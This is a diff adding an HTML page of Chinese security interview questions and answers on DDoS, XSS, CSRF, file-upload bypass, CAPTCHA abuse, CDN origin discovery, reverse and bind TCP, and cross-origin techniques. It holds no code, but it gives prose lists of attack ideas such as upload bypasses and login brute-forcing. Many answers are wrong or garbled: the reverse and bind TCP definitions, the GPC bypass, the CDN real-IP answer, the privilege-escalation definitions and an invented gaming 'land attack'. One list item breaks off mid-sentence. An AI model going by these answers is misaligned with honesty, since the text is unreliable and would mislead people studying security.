+<p>5、安全监控和日志审计：通过监控和审计云中的操作和活动，发现和应对安全事件和威胁。</p>
+<h2>了解过 websocket 吗?</h2>
+<p>了解过</p>
+<p>WebSocket 是一种在单个 TCP 连接上进行全双工通信的 <code>网络协议</code>。它使得浏览器和服务器之间的实时数据传输变得更加容易。与 HTTP 请求-响应协议不同，WebSocket 连接保持打开状态，允许双向通信，因此可以通过 WebSocket 连接 <code>实时更新数据</code>，<strong>而无需通过不断的 HTTP 请求来获取更新</strong>。</p>
+<p>WebSocket 连接的建立需要经过一个握手过程，客户端和服务器在握手期间交换信息以建立连接。在成功建立连接之后，客户端和服务器可以相互发送消息，这些消息可以是文本、二进制数据或 JSON 等格式。在服务器端，通常使用 WebSocket API 来处理接收到的消息并响应客户端的请求。</p>
+<p>由于 WebSocket 协议是在单个 TCP 连接上运行的，因此可以降低网络延迟和带宽消耗。它还允许服务器推送数据给客户端，这对于实时数据更新和即时通讯非常有用。</p>
+<p>常被用在 web 开发当中</p>
+<h2>DDOS 是什么?有哪些?CC 攻击是什么?区别是什么?</h2>
+<p>1、DDOS 是一种网络攻击方式，攻击者通过控制多台计算机或设备，向目标服务器或网络发起 <code>大量的请求</code>，使其无法正常处理合法的网络流量，导致 <code>服务不可用</code>。攻击者的目的通常是让目标系统无法提供正常服务，从而造成经济损失或者影响其声誉等。</p>
+<p>2、常见的 DDOS 攻击方式包括：</p>
+<p>SYN Flood：利用 TCP 三次握手协议中的漏洞，发送大量的 <code>SYN请求</code>，耗尽服务器资源。</p>
+<p>ICMP Flood：利用 <code>ping命令</code>，向目标服务器发送大量的 <code>ICMP请求</code>，耗尽服务器资源。</p>
+<p>UDP Flood：利用 UDP 协议的特性，发送大量的 <code>UDP数据包</code>，占用服务器带宽和 CPU 资源。</p>
+<p>3、CC 攻击（HTTP Flood）是一种特殊的 DDOS 攻击方式，其主要针对的是 Web 服务器。攻击者通过 <code>伪造HTTP请求</code>，向 Web 服务器发送 <code>大量的请求</code>，<code>模拟用户访问</code>，从而使得服务器过载，无法正常处理合法的网络流量</p>
+<p>4、区别：<br>
+攻击对象不同：DDoS 是针对 <code>IP的攻击</code>。CC 攻击针对的是 <code>网页</code>。<br>
+危害不同：DDoS 攻击危害性较大，更难防御。CC 攻击的危害不是毁灭性的，但是持续时间长。<br>
+门槛不同：DDoS 攻击门槛高，攻击者一般需要在攻击前搜集被攻击目标主机数目、地址情况、目标主机的配置性能等资料，盲目攻击可能导致 <code>效果不佳</code>。CC 攻击门槛低，利用更换 IP 代理工具即可实施攻击，且 <code>目标比较明确</code>，黑客水平比较低的用户也能进行。<br>
+流量大小不同：DDoS 攻击比 CC 攻击所需要流量更大，且 CC 攻击有时不需要很大的流量。</p>
+<h2>land 攻击是什么?</h2>
+<p>1、如果你是在计算机安全领域提到“land 攻击”，那么它指的<strong>是一种早期的拒绝服务攻击（DoS 攻击）技术</strong>，攻击者向目标计算机发送特制的 IP 数据包，其中源 IP 地址和目标 IP 地址都被设置成目标计算机的 IP 地址。这种攻击会导致目标计算机陷入死循环，最终无法响应其他的网络请求。这种攻击现在已经很少见了，因为现代的操作系统已经修复了这个漏洞。</p>
+<p>2、如果你是在网络游戏领域提到“land 攻击”，那么它指的是一种利用游戏引擎漏洞的攻击方式，攻击者可以利用这些漏洞来让目标玩家的游戏客户端崩溃或卡死。这种攻击也可以被视为一种 DoS 攻击。</p>
+<h2>你会如何进行信息收集?</h2>
+<p>收集二级域名，ip 敏感信息收集，指纹，waf 识 ，CDN 识别，旁注 C 段</p>
+<h2>什么是 CRLF 注入攻击?</h2>
+<p>CRLF 注入攻击是一种 <code>Web应用程序漏洞</code>，它允许攻击者在 HTTP 头中注入恶意 HTTP 响应头。攻击者可以使用 CRLF 注入攻击来操纵 HTTP 响应，从而获得服务器的访问权限，或者攻击者可以 <code>绕过安全控制</code>，以访问未经授权的敏感信息。</p>
+<h2>防止 XSS，前端后端两个角度思考?</h2>
+<p>前端：</p>
+<p>1）使用 <code>HTTPS</code> 协议来保护用户数据和传输数据。</p>
+<p>2）使用 <code>转义字符</code> 来过滤用户输入的特殊字符，以防止攻击者注入恶意的 JavaScript 代码。</p>
+<p>3）禁止用户上传 <code>可执行文件</code>，如.exe、.vbs 等。</p>
+<p>4）使用 HTTP 头来限制网页内容的加载，以防止 XSS 攻击。</p>
+<p>后端：</p>
+<p>1）使用参数校验来检查用户输入的数据是否符合要求，如果不符合要求，则拒绝访问。</p>
+<p>2）使用 <code>预编译语句</code> 来执行 SQL 查询，以防止 SQL 注入攻击。</p>
+<p>3）使用安全的 <code>加密算法</code> 来加密数据，以防止数据泄露。</p>
+<p>4）使用安全的 HTTP 头来限制网页内容的加载，以防止 XSS 攻击。</p>
+<h2>如何防护一个端口的安全?</h2>
+<ol>
+<li>使用防火墙：防火墙可以阻止未经授权的网络流量进入网络，从而保护端口安全。</li>
+<li>安装安全软件：安装安全软件可以检测和阻止恶意软件和病毒的入侵，从而保护端口安全。</li>
+<li>实施安全策略：实施安全策略可以限制用户访问特定端口，从而保护端口安全。</li>
+<li>定期更新操作系统：定期更新操作系统可以修复漏洞，从而保护端口安全。</li>
+<li>加密数据传输：使用加密技术可以保护数据传输，从而保护端口安全。</li>
+</ol>
+<h2>webshell 检测思路?</h2>
+<ol>
+<li>检查文件名：检查文件名是否与 webshell 相关，如果是，则可能是 webshell。</li>
+<li>检查文件内容：检查文件内容是否包含 webshell 特征，如果是，则可能是 webshell。</li>
+<li>检查文件权限：检查文件权限是否被更改，如果是，则可能是 webshell。</li>
+<li>检查文件时间：检查文件的创建时间和修改时间，如果有异常，则可能是 webshell。</li>
+<li>检查文件大小：检查文件的大小，如果文件大小异常，则可能是 webshell。</li>
+</ol>
+<h2>GPC 是什么?开启了怎么绕过</h2>
+<p>GPC 是 <code>GET、POST、COOKIE</code> 的简写，用于描述在进行 URL 提交时，用户可以提交的三种类型的数据。如果想要绕过 GPC，可以使用 URL 重写、伪静态、XMLHttpRequest 等技术。</p>
+<p>URL 重写可以将 URL 参数放在 URL 路径中，但不会显示在 URL 里，从而避免被 GPC 过滤。</p>
+<p>伪静态可以将普通的 URL 重新排列，从而使它看起来更加有吸引力，也可以隐藏 URL 参数，从而绕过 GPC 过滤。</p>
+<p>XMLHttpRequest 可以将 POST 请求发送到后台，而不需要发送任何 URL 参数，从而避免被 GPC 过滤。</p>
+<h2>web 常用的加密算法有什么</h2>
+<ol>
+<li>MD5：Message-Digest Algorithm 5，<code>信息摘要算法</code>，常用于文件校验。</li>
+<li>SHA：Secure Hash Algorithm，<code>安全散列算法</code>，常用于数字签名等安全认证场景。</li>
+<li>HMAC：Hash Message Authentication Code，<code>散列消息鉴别码</code>，常用于消息完整性校验。</li>
+<li>AES：Advanced Encryption Standard，<code>高级加密标准</code>，常用于数据加密。</li>
+<li>RSA：Rivest-Shamir-Adleman，常用于数字签名和加密。</li>
+<li>DES：Data Encryption Standard，数据加密标准，常用于加密和解密。</li>
+<li>3DES：Triple DES，三重数据加密算法，是 DES 的一种改进版本。</li>
+<li>Blowfish：一种对称加密算法，可以用来加密大量数据。</li>
+<li>Twofish：一种对称加密算法，可以用来加密大量数据。</li>
+<li>RC4：一种流加密算法，可以用来加密大量数据。</li>
+<li>PBKDF2：Password-Based Key Derivation Function 2，基于密码的密钥派生函数 2，常用于加密口令。</li>
+<li>Bcrypt：一种密码散列函数，可以用来加密口令。</li>
+<li>SCrypt：一种密码散列函数，可以用来加密口令。</li>
+<li>Argon2：一种密码散列函数，可以用来加密口令。</li>
+</ol>
+<h2>XSS 除了获取 cookies 还能做什么?</h2>
+<p>XSS 可以用来做的其他事情有：</p>
+<ol>
+<li>劫持用户会话：通过 XSS 攻击，攻击者可以访问受害者的用户会话，从而获取用户的登录凭据或其他敏感信息。</li>
+<li>修改网页内容：XSS 攻击可以用来修改网页内容，从而欺骗受害者。</li>
+<li>破坏网站结构：XSS 攻击可以用来破坏网站结构，从而影响网站的正常运行。</li>
+<li>获取用户数据：XSS 攻击可以用来获取用户的敏感信息，比如用户的个人信息、财务信息等。</li>
+<li>执行恶意脚本：XSS 攻击可以用来执行恶意脚本，从而对网站进行攻击或进行其他恶意活动。</li>
+<li>传播蠕虫：XSS 攻击可以用来传播蠕虫，从而在受害者网络中传播恶意程序。</li>
+<li>劫持浏览器：XSS 攻击可以用来劫持浏览器，从而控制用户的浏览习惯。</li>
+<li>弹出恶意广告：XSS 攻击可以用来弹出恶意广告，从而影响用户的正常使用。</li>
+<li>注入恶意代码：XSS 攻击可以用来注入恶意代码，从而影响网站的正常运行。</li>
+<li>操纵搜索结果：XSS 攻击可以用来操纵搜索结果，从而让受害者访问攻击者想要让他们访问的网站。</li>
+<li>传播木马程序：XSS 攻击可以用来传播木马程序，从而攻击网站或窃取用户信息。</li>
+<li>劫持网站：XSS 攻击可以用来劫持网站，从而控制网站的内容和功能。</li>
+</ol>
+<h2>运营商（或其他）网络劫持</h2>
+<p>1、当网络劫持发生时，请求被运营商（或其他劫持者）拦截，由他们发送响应。劫持者可能会插入恶意内容，植入广告，并通过注入脚本对内容进行修改。劫持者可能会拦截特定的内容以及用户的 HTTP 请求，从而控制用户的浏览体验。</p>
+<p>2、网络劫持可能会导致安全和隐私问题，因为劫持者可以收集用户的敏感信息，例如用户凭据和登录信息。它还可能导致网络流量减少，并且由于广告和注入的脚本，网页可能会变得非常缓慢。</p>
+<p>3、要避免网络劫持，可以使用 SSL/TLS 协议保护通信，在发送敏感数据之前进行网站验证，并使用一款受信任的 VPN 来加密通信。此外，还应该定期更新设备的操作系统和浏览器，并只从可信的源下载软件或应用程序。</p>
+<p>4、要继续防止网络劫持，应该禁用网络中的一些危险的功能，例如域名服务器（DNS）的动态更新，DNS 重定向，以及远程访问功能。另外，还应设置安全软件来帮助检测潜在的网络劫持活动。最后，运营商可以设置灰度测试策略来帮助发现违规活动。</p>
+<h2>DNS 欺骗是什么</h2>
+<p>DNS 欺骗是一种网络攻击技术，可以改变 Internet 上查找 Web 服务器和其他 Internet 资源的本地 DNS（域名系统）表。攻击者通过更改服务器上的 DNS 记录，可以将 Internet 流量重定向到攻击者控制的服务器，用于盗取数据，植入恶意软件，或重新定义未经授权的网络配置。</p>
+<h2>缓冲区溢出原理和防御</h2>
+<p>缓冲区溢出是一种软件漏洞，在这种漏洞中，攻击者可以利用保存数据的内存单元越界访问其他内存空间，访问此类内存导致系统崩溃或可执行恶意代码。</p>
+<p>要防止缓冲区溢出攻击，可以采用多种措施，包括使用堆栈保护机制（如堆栈溢出保护、边界检查缓冲区），使用隔离内存技术（ASLR），以及使用深度检查技术（如恶意代码检查、反编译检查）。另外，还可以使用动态分析技术（如在线分析），以及代码审计技术来防御缓冲区溢出。</p>
+<h2>网络安全事件应急响应</h2>
+<p>网络安全事件应急响应是指在发生网络安全事件时，企业应组织有关部门统一协调，根据网络安全应急响应计划或网络安全事件预案的要求，及时采取相应的应对措施。</p>
+<p>它包括：</p>
+<p>（1）应急预案设计：进行安全事件预测和分析，制定网络安全应急响应计划和网络安全事件处置预案，以应对网络安全事件。</p>
+<p>（2）故障消除：组织资源进行安全故障分析，查明故障原因并消除故障源。</p>
+<p>（3）事件处理：对网络安全事件进行识别，分析和处理，以及健全后续处理流程。</p>
+<p>（4）控制措施落实：制定、落实有效的管理措施，防止网络安全事件的再次发生。</p>
+<p>（5）风险预警：建立网络安全风险预警系统，严格完善网络安全管理，从而及时防范网络安全事件。</p>
+<p>（6）数据处置：收集、处理和存储处置期间涉及的所有数据，避免安全事件再次发生。</p>
+<p>（7）应急测试：分析处理后的网络安全状态，实施应急测试，确保安全恢复后的网络安全可用性。</p>
+<p>（8）应急评估：对安全事件处置作出总结，评估应急处置效果，并采取有效的改进措施，减少安全事件的发生几率。</p>
+<p>（9）安全意识培训：对员工进行网络安全意识培训，增强员工的网络安全意识，使其熟悉网络安全技术、安全风险评估技术及网络安全威胁信息处理技术，预防网络安全事件发生。</p>
+<p>（10）复查审计：定期复查审计网络安全事件及应急响应活动，以及建立长期的安全应急响应机制。</p>
+<h2>企业内部安全</h2>
+<p>企业内部安全管理是指企业内部管理机构对企业内部安全状况的管理，包括安全管理制度、安全管理措施、安全管理机构和安全管理人员等。</p>
+<p>1、制定安全管理制度：企业应制定安全管理制度，明确安全管理的职责、权限和程序，确保安全管理的有效实施。</p>
+<p>2、实施安全管理措施：企业应根据安全管理制度，采取有效的安全管理措施，确保企业内部安全状况的稳定。</p>
+<p>3、建立安全管理机构：企业应建立安全管理机构，负责安全管理工作，确保安全管理的有效实施。</p>
+<p>4、培训安全管理人员：企业应定期对安全管理人员进行培训，使其具备安全管理的知识和技能，确保安全管理的有效实施。</p>
+<p>5、定期检查安全状况：企业应定期检查企业内部安全状况，及时发现安全隐患，采取有效措施，确保企业内部安全状况的稳定。</p>
+<p>6、及时处理安全事故：企业应及时处理安全事故，分析事故原因，采取有效措施，防止安全事故的发生。</p>
+<p>7、定期评估安全管理：企业应定期评估安全管理的效果，及时发现安全管理中存在的问题，采取有效措施，确保安全管理的有效实施。</p>
+<p>8、定期更新安全管理制度：企业应定期更新安全管理制度，使其与企业实际情况相适应，确保安全管理的有效实施。</p>
+<p>9、定期开展安全宣传：企业应定期开展安全宣传，使员工充分了解安全管理的重要性，确保安全管理的有效实施。</p>
+<p>10、建立安全档案：企业应建立安全档案，记录安全管理的相关信息，便于安全管理的有效实施。</p>
+<h2>业务上线前，怎么测试，从哪些角度测试</h2>
+<p>首先，你需要知道你的网站是否正常运行。如果你的网站出"错误提示"来查看。如果你的网站正常运行，你可以通过测试你的网站的功能来测试它的效果。例如，你可以测试你的网站的页面加载速度和页面的显示效果。</p>
+<p>其次，你需要知道你的网站的内容是否正确。如果你的网站内容出现问题，可以通过测试你的网站的内容的格式和数据的结构来测试它的效果。例如，你可以测试你的网站的内容的格式和数据的结构。</p>
+<p>最后，你需要知道你的网站是否正确的链接。如果你的网站链接出现问题，可以通过测试你的网站的链接的结构和功能来测试它的效果。例如，你可以测试你的网站的链接的结构和功能。</p>
+<h2>应用有漏洞，但是无法修复和停用，你怎么办</h2>
+<ol>
+<li>尽快通知应用的开发者，让他们尽快修复漏洞。</li>
+<li>尽量减少应用的使用，以降低漏洞的影响。</li>
+<li>将应用的使用权限限制在最低，以降低漏洞的影响。</li>
+<li>定期检查应用的安全性，及时发现漏洞并采取有效措施。</li>
+<li>将应用的使用限制在可信任的环境中，以降低漏洞的影响。</li>
+</ol>
+<h2>CSRF 怎么防护?</h2>
+<p>1、在用户每次登录的时候设置唯一的会话标识符（类似与令牌）;</p>
+<p>2、在表单提交前把这个会话标识符附加到表单中；</p>
+<p>3、在接受表单提交后，使用会话标识符与之前存储在服务器上的值进行比对；</p>
+<p>4、在验证成功之后，这个标识符将被删除或者重新生成新的标识符；</p>
+<p>5、如果验证失败，请求将被拒绝，把用户重定向回到登录页面，或者给出警告。</p>
+<h2>文件上传绕过方法?</h2>
+<p>1、文件扩展名绕过：将文件后缀改为常见的文件扩展名，例如.js、.jpg、.exe 等；</p>
+<p>2、根据文件头信息修改文件扩展名：一些图片文件，如 png、gif、jpg 等，都有自身的文件头，可以在文件开头修改其文件头；</p>
+<p>3、使用 base64 编码上传：将需要上传的文件用 Base64 编码，再结合 XMLHttpRequest 上传；</p>
+<p>4、字符串文件上传：根据文件格式将其转换为字符串，再利用 eval 等函数取值；</p>
+<p>5、“多部分/表单编码（multipart/form-data）”信息：一般 Web 应用都是采用此种格式上传文件，利用多级分割，传一个字符串 $_FILES 文件域数组；</p>
+<p>6、采用数据库存储文件：可以把文件当做二进制数据，存在数据库里，再获取路径下载；</p>
+<p>7、遗漏文件类型：尝试上传各类类型文件，以不合法文件类型方式绕过限制，如 JSP 等；</p>
+<p>8、Exe 反射：Exe 反射加载是将非托管代码（如 C + +）编译成可执行模块并从可执行程序中加载到当前应用程序域中。</p>
+<h2>验证码相关利用点</h2>
+<ol>
+<li><strong>注册功能绕过：</strong></li>
+</ol>
+<p>可以使用工具给指定页面中的包含验证码的表单提交 HTTP 请求，破解验证码，最终实现注册成功，但是手机收不到短信验证信息，从而绕过手机绑定等操作。</p>
+<ol start="2">
+<li><strong>访问受限功能：</strong></li>
+</ol>
+<p>利用验证码可以不正当的访问受限的功能，在功能已经设计好的情况下，只有特定的用户可以访问，但若利用破解等手段，可以实现非法访问。</p>
+<ol start="3">
+<li><strong>前台表单提交：</strong></li>
+</ol>
+<p>在前台表单提交时，利用验证码来破解系统的正确提交，从而实现只要破解正确的验证码，可以无限制的提交表单，最终导致后台的系统负载异常。</p>
+<ol start="4">
+<li><strong>获取礼品：</strong></li>
+</ol>
+<p>破解验证码可以获取大量的礼品，甚至一些比较特殊的，但又具有一定价值的礼品，从而达到攻击者的利益目的。</p>
+<p>验证码的防御方式</p>
+<ol>
+<li><strong>精确验证：</strong></li>
+</ol>
+<p>在验证码和用户输入的验证码进行对比时，精确到比较到空格及标点符号，从而减少验证码被破解几率。</p>
+<ol start="2">
+<li><strong>使用图片验证码：</strong></li>
+</ol>
+<p>图片验证码由于使用了真实图片，从而增加验证难度，因此可以更好的防止机器人攻击及被脚本破解的可能性。</p>
+<ol start="3">
+<li><strong>动态调整验证码：</strong></li>
+</ol>
+<p>动态调整验证码的形式，使验证码每一次显示均不同，不仅可以骗过机器，而且也可以减少暴力破解的可能性。</p>
+<ol start="4">
+<li><strong>及时更新、更新验证码策略：</strong></li>
+</ol>
+<p>随着技术的不断发展，究竟何种能有效的破解验证码也在不断变换，所以建议验证码应该及时更新，并使用加长、加复杂性的验证码，尽可能将破解算法及尽可能难以被破解。</p>
+<h2>cookie 你会测试什么内容</h2>
+<ol>
+<li>检查 cookie 值是否符合预期。</li>
+<li>测试 cookie 是否按照设定的有效期，被正确删除。</li>
+<li>检查 cookie 是否存在安全漏洞。</li>
+<li>测试 cookie 是否以安全的方式存储在客户端。</li>
+<li>检查 cookie 的值是否跨站点跟踪，该类型的 cookie 用于非法目的。</li>
+<li>测试 cookie 在不同浏览器上的兼容性。</li>
+<li>检查 cookie 的值是否已编码，以防止攻击者获取有效数据。</li>
+<li>检查 uri 路径是否正确设置，以确保 cookie 正确发送。</li>
+<li>检查 cookie 的首选项设置是否严格，以确保安全性。</li>
+<li>检查发送到 cookie 的所有数据是否被编码、压缩或加密，以防止未经授权的第三方访问。</li>
+</ol>
+<h2>说出几个业务逻辑漏洞类型?</h2>
+<ol>
+<li>权限控制漏洞：攻击者利用漏洞绕过系统的访问限制，获取高权限的未授权的访问权限。</li>
+<li>功能攻击漏洞：攻击者恶意篡改文件结构或系统信息，达到辅助操作的想要的效果。</li>
+<li>越权漏洞：攻击者利用漏洞获取具有非授权访问权限的受保护的系统资源访问权限。</li>
+<li>数据控制漏洞：攻击者可以利用漏洞篡改系统中一些受保护的数据和信息，更改其原有的用途。</li>
+<li>虚拟化漏洞：通过攻击者获取被保护的虚拟机资源或访问被控制的专用虚拟机中的数据。</li>
+<li>特权升级漏洞：攻击者以一般用户的身份登录，通过漏洞获得系统的最高权限。</li>
+<li>数据库漏洞：攻击者也可以通过注入、数据库暴力破解等手段访问系统的受保护的数据库信息。</li>
+<li>覆盖签名攻击：攻击者篡改交互双方通信中的数据，伪造返回信号以达到冒充另一方的目的。</li>
+<li>缓冲区溢出漏洞：攻击者利用缓冲区内容溢出获取系统内存中的受保护数据。</li>
+<li>会话固定漏洞：攻击者利用会话固定技术，获取其他用户的身份信息。</li>
+</ol>
+<h2>简述文件包含漏洞</h2>
+<p>文件包含漏洞是一种导致服务器上的文件被非法访问的安全漏洞，这种漏洞通常是由不当的 Web 编程实现引起的，允许攻击者从外部文件中读取服务器上的数据。在 Web 应用中，比如表单和 URL 参数，开发人员通常允许提交带有特定值的信息，包括文件的路径和文件名，这样网页应用程序就可以加载相应的文件。如果攻击者能够控制提供的文件名，就能够从服务器获取有敏感信息的文件。</p>
+<h2>业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的?</h2>
+<p>一个典型的用户任意密码重置漏洞例子是，注册时用户没有填写安全的邮箱或设置密保问题，但仍然可以任意重置密码。这种漏洞一般是因为一些应用系统缺乏完善的安全验证机制，没有设置足够的安全防护措施来防止未经认证的用户从外部重置密码，从而导致了这种安全漏洞的发生。</p>
+<h2>渗透测试过程中发现一个只能上传 zip 文件的功能，有什么可能的思路?</h2>
+<ol>
+<li>试图绕过扩展名限制，上传其他文件类型，如 asp/PHP/exe 文件，来尝试访问文件或执行程序；</li>
+<li>将恶意的 php 文件做成 zip 形式压缩，再上传；</li>
+<li>尝试更改 zip 的文件结构，破解内部的文件；</li>
+<li>通过 zip 文件木马注入，把恶意程序传播到其他用户或系统；</li>
+<li>尝试解密除压缩密码保护的 zip 文件，在不可见的地方体现第二层后门；</li>
+<li>通过提取 zip 文件的文件信息，尝试获取隐藏的恶意代码和信息；</li>
+<li>尝试上传 zip 文件后仍保持压缩包原本完整的形式；</li>
+<li>尝试发现不处理 zip 中的文件信息，出现漏洞；</li>
+<li>尝试从 zip 中提取出有副作用的附加代码；</li>
+<li>检测上传文件大小，尝试把太大的文件压缩后再上传；</li>
+<li>尝试结合压缩文件本身的特性，对目标系统进行 DoS（拒绝服务）攻击；</li>
+<li>对 zip 文件进行逆向工程，在字符序列中寻找内容可利用的信息；</li>
+<li>尝试魔盒攻击，上传 zip 文件，当它被下载时被篡改，短期内使";</li>
+</ol>
+<h2>为什么 aspx 木马权限比 asp 大?</h2>
+<p>因为 ASP 页面的权限只有简单的可执行权限，而 ASPX 页面拥有类似于完整文件系统的权限，可以让攻击者实现更多的功能，比如：访问系统文件、查看远程数据库、添加新用户等。</p>
+<h2>只有一个登录页面有哪些思路?</h2>
+<ol>
+<li>检测页面中的客户端和服务端漏洞，如 XSS，SQL 注入等。</li>
+<li>枚举管理员用户名，尝试常见密码。</li>
+<li>测试 HTTP 头中的信息，如 HTTP 头允许跨站脚本（XSS），防止缓存信息等。</li>
+<li>尝试暴力密码破解，不断尝试登录直到获得正确的用户名和密码。</li>
+<li>尝试在登录表单中注入有效载荷，以绕过认证流程。</li>
+<li>检查并测试所有可用 API，以确定是否存在任何漏洞。</li>
+<li>检查登录页面的 SSL/TLS 证书是否有效。</li>
+<li>尝试在登录页面访问特定的文件夹，以查看是否存在任何可以利用的权限问题。</li>
+<li>检查是否有明文存储用户名和密码。</li>
+<li>尝试通过擦除 cookie、修改 cookie 和请求头信息等，让浏览器在登录表单中注入有效载荷。</li>
+</ol>
+<h2>请求头中哪些是有危害的?</h2>
+<p>恶意的 HTTP 头包括：</p>
+<p>1、X-Forwarded-For：此头表示 HTTP 请求中客户端的 IP 地址。某些 client 看到此标头并将其发送到 Web 服务器，以弱化客户端安全性。</p>
+<p>2、Cookie：Cookies 是 Web 应用程序标识用户的唯一方法，如果攻击者可以篡改 Cookie 并将恶意值植入其中，它可能会导致未经授权的访问。</p>
+<p>3、User-Agent：某些攻击者可能会改变此标头，以隐藏他们的硬件及操作系统的型号。</p>
+<p>4、Referer：此标头跟踪用户来自哪里，恶意攻击者可能会使用此标头向用户发送恶意网站的链接。</p>
+<h2>谈谈水平/垂直/未授权越权访问的区别?</h2>
+<p>水平越权访问指的是当一名用户尝试访问另一名用户或资源，但其等级不比他以上，因此无法实现。水平越权对于维护安全性是非常重要的，用户只能访问自己的内容，而不能访问另一个用户的内容。</p>
+<p>垂直越权访问是指一个用户经过授权可以获得更高一级的权限，即不允许访问更高级别，但是允许访问更高层级的权限。例如，一个可以查看某个网站的文章，但可以添加和修改文章的用户，他就经过了垂直越权访问。</p>
+<p>未授权越权访问指的是一个用户尝试访问另一个未经授权的用户或资源，这是一种非法的行为，一旦发现便立即拒绝该访问。未授权的越权行为可能会破坏系统完整性，或者丢失私人数据，因此这是一个非常严重的问题。</p>
+<h2>xss 有什么?执行存储型的 xss 的危害和原理</h2>
+<p>XSS（跨站脚本攻击）是一种常见的网络攻击，是一种经典的前端漏洞，可溯源于服务器端指令处理过程中的参数没有做安全过滤引起的。XSS 有多种类型，执行存储型 XSS 攻击的危害有：</p>
+<ol>
+<li>可被攻击者控制的完全执行，无需用户互动就可以实现；</li>
+<li>将可执行代码存储在服务器上，从而通过脚本技术获取用户信息；</li>
+<li>将恶意代码附加到正常页面以及向用户提供他们不想要的第三方内容，或弹出虚假的宣传窗口。</li>
+</ol>
+<p>执行存储型的 XSS 的原理是：服务器端在处理参数时没有过滤掉特殊字符，将恶意脚本注入到服务器端；当用户访问具有恶意脚本的页面时，该脚本被自动执行，从而允许攻击者控制用户的会话，实施更多攻击。</p>
+<h2>主机疑似遭到入侵，要看哪里的日志</h2>
+<p>要看哪里的日志，取决于具体的操作系统，通常可以看/var/log 下的各类日志文件，如操作系统的安全日志、应用程序的日志文件等。此外，也可以检查系统防火墙的日志，包括拒绝服务器上的访问记录，以及网络流量日志等。</p>
+<h2>python 常用的标准库</h2>
+<ol>
+<li>操作系统接口：os、os.path、subprocess、shutil；</li>
+<li>文件通配符：glob；</li>
+<li>字符串处理：re、string、difflib、textwrap、unicodedata；</li>
+<li>数据编码和处理：base64、codecs、csv、xml；</li>
+<li>数学：decimal、fractions、math、random、statistics；</li>
+<li>日期和时间：datetime、time；</li>
+<li>拆分合并数据：collections、 copy、heapq、bisect；</li>
+<li>数据压缩和归档：zlib；</li>
+<li>文件加载器：fnmatch；</li>
+<li>流控制和种子：itertools；</li>
+<li>线程和进程：threading、multiprocessing；</li>
+<li>调试器：pdb；</li>
+<li>软件包：pkgutil、modulefinder、zipimport；</li>
+<li>系统及环境：sys、warnings、contextlib、platform、getopt、argparse；</li>
+<li>Internet 数据处理：urllib、urllib2、http、smtplib、poplib、imaplib、ftplib、telnetlib；</li>
+<li>其他：struct、copyreg、shelve、weakref。</li>
+</ol>
+<h2>reverse tcp 和 bind tcp 的区别?</h2>
+<p>TCP 建立连接时有两种方式：Reverse TCP 和 Bind TCP。</p>
+<p>Reverse TCP 是客户端服务器之间“相反”的连接，因为客户端将尝试连接服务器，然后服务器返回一个确认连接。这是最常见的传输控制协议（TCP）连接模型，比如客户端浏览器和服务器之间的 HTTP 连接。</p>
+<p>Bind TCP 是服务器等待客户端的连接，服务器主动发出“绑定”请求，然后等待客户端响应，如果客户端响应，连接建立成功。这是客户端登录 FTP 服务器时使用的模型，即服务器监听某个端口并等待客户端接入。</p>
+<h2>oauth 认证过程中可能会出现什么问题，导致什么样的漏洞?</h2>
+<ol>
+<li>认证过程中可能出现的漏洞包括：认证信息不正确、认证信息不安全、认证回调不可靠、对认证信息的滥用等。</li>
+<li>这些问题可能会导致攻击者窃取访问令牌，注入恶意请求，篡改网络数据，窃取用户的隐私信息等漏洞。</li>
+</ol>
+<h2>做了 cdn 的网站如何获取真实 IP</h2>
+<ol>
+<li>添加通过 X-Forwarded-For 获取真实 IP：如果您的 CDN 服务器可以设置 X-Forwarded-For 头部，我们可以在服务器端获取到客户真实 IP 地址。</li>
+<li>使用 CDN API：某些 CDN 服务提供了 API 接口，可以直接通过 API 接口获取客户真实 IP 地址。</li>
+<li>通过 HTTP 头部获取真实 IP：如果 CDN 服务器添加了 HTTP 头信息，您可以通过获取 HTTP 头信息获取客户的真实 IP 地址。</li>
+<li>使用 Google 开放的 API：可以使用 Google 的开放的地理定位 API，用客户的 IP 地址获得结果，可以轻松获取到客户的真实 IP 地址。</li>
+<li>使用第三方 IP 查询 API：可以使用第三方的 IP 查询 API 获得客户的真实 IP 地址。</li>
+<li>直接检查 HTTP 请求数据包：在服务器端抓取 HTTP 请求数据的源 IP 地址，从而可以获得客户的真实 IP 地址。</li>
+<li>使用 IPv6 地址识别方法：对 IPv6 地址进行检测可以识别端用户的真实 IP 地址。</li>
+<li>通过防火墙日志获取真实 IP：可以从防火墙日志中获取客户的真实 IP 地址。</li>
+<li>通过服务器日志获取真实 IP：通过服务器日志也可以识别出客户的真实 IP 地址。</li>
+<li>使用 NETGEAR ACE API 获取真实 IP：可以使用 NETGEAR ACE API 获取客户的真实 IP 地址。</li>
+</ol>
+<h2>如何实现跨域?</h2>
+<p>跨域是指浏览器禁止从一个源加载来自另一个源的内容，这些内容可能是静态文件，如 JavaScript 和 CSS，也可能是由服务器上的数据动态生成的。</p>
+<ol>
+<li>
+<p>使用 JSONP 实现跨域:</p>
+<p>JSONP (JSON with Padding)在仅看 html 内容的时候，将另一个域加载到当前页面的一种技术，它允许跨域调用脚本文件，从而实现跨域的数据传输。</p>
+</li>
+<li>
+<p>使用 CORS 实现跨域:</p>
+<p>CORS（跨源资源共享/跨域资源共享）是一种用于实现跨源请求的技术，它使浏览器可以发送和接收跨源 http 请求，从而进行跨域数据传输。</p>
+</li>
+<li>
+<p>使用 Nginx 代理实现跨域:</p>
+<p>使用 Nginx 代理是针对 ajax 发起的 http 请求，利用 Nginx 的反向代理的能力，将客户端向服务器端发起的请求，由 Nginx 服务器端转发到源服务器，客户端得到的返回值仍然是由 Nginx 服务器返回的，从而达到跨域的目的。</p>
+</li>
+</ol>
+<h2>jsonp 跨域与 CORS 跨域的区别?</h2>
+<ol>
+<li>JSONP 是一种可以解决跨域问题的脚本，可以在不支持 CORS 的浏览器中使用，而 CORS 则是一种机制，它允许浏览器将一个在一个域名中的资源发送到另一个域名。</li>
+<li>JSONP 不是传统意义上的 Ajax 请求，而 CORS 是传统意义上的 Ajax 请求。</li>
+<li>JSONP 跨域的过程由浏览器来发起，而 CORS 跨域过程由服务器来发起。</li>
+<li>JSONP 有自己的 script 标签和 callback 函数，而 CORS 是基于 HTTP 头信息来进行跨域操作的。</li>
+<li>JSONP 只支持 get 请求，而 CORS 支持所有类型的 HTTP 请求。</li>
+</ol>
+<h2>算法?了解过什么排序?</h2>
+<p>排序算法一般分为内排序和外排序两类。</p>
